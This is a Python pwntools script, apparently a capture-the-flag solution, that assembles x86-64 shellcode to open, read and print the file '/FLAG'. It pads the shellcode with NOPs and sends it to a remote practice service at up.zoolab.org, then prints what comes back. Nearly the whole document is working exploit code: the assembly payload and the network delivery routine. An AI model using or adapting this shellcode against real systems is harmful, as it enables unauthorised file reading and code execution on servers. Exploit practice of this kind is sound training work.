import socket
from pwn import * # Import pwntools

# --- Pwntools Setup ---
context.clear(arch='amd64')

# --- Assembly Code (No Comments) ---
assembly_code = """
    jmp short call_flag

do_shellcode:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    sub rsp, 0x40
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    syscall

    add rsp, 0x40
    mov rax, 60
    xor rdi, rdi
    syscall

call_flag:
    call do_shellcode
    .asciz "/FLAG"
"""

# --- Assemble the code ---
try:
    shellcode_flag = asm(assembly_code)
except PwnlibException as e:
    print(f"[-] Pwntools assembly error: {e}")
    exit(1)

# Check if the shellcode is too long
if len(shellcode_flag) > 100:
    print(f"[-] Error: Shellcode is too long ({len(shellcode_flag)} bytes).")
    exit(1)

print(f"[+] Assembled shellcode ({len(shellcode_flag)} bytes): {shellcode_flag.hex()}")

# Pad with NOPs (\x90) to reach 100 bytes
payload_flag = shellcode_flag.ljust(100, b'\x90')


# --- Network Code (same as before) ---
HOST = "up.zoolab.org"
PORT = 12341

def main():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print(s.recv(1024).decode('utf-8', errors='ignore'), end='')
            print(s.recv(1024).decode('utf-8', errors='ignore'), end='')
            
            s.send(payload_flag)
            print("[+] Payload sent.")

            print("[*] Waiting for response (flag)...")
            full_response = b""
            s.settimeout(5.0) 
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: 
                        print("[-] Connection closed by server.")
                        break
                    full_response += chunk
            except socket.timeout:
                print("[-] Socket recv timed out.")
            except Exception as e:
                print(f"[!] Error during recv: {e}")

            if full_response:
                print("\n[+] Response from server after sending payload:")
                try:
                    print(full_response.decode('utf-8', errors='replace'))
                except UnicodeDecodeError:
                    print("[!] Could not decode response as UTF-8. Raw response:")
                    print(full_response)
            else:
                print("\n[-] No further data received from server.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()